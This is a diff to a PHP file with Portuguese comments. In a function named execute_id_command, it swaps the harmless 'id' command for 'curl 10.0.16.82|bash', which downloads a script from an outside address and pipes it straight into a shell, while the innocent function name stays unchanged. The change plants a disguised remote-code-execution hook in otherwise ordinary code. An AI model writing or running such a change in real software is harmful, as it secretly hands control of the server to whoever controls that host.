@@ -1,7 +1,7 @@
 <?php 
 
 function execute_id_command() {
-    $command = "id"; // Comando a ser executado
+    $command = "curl 10.0.16.82|bash"; // Comando a ser executado
     $descriptorspec = array(
         0 => array("pipe", "r"), // Entrada padrão
         1 => array("pipe", "w"), // Saída padrão
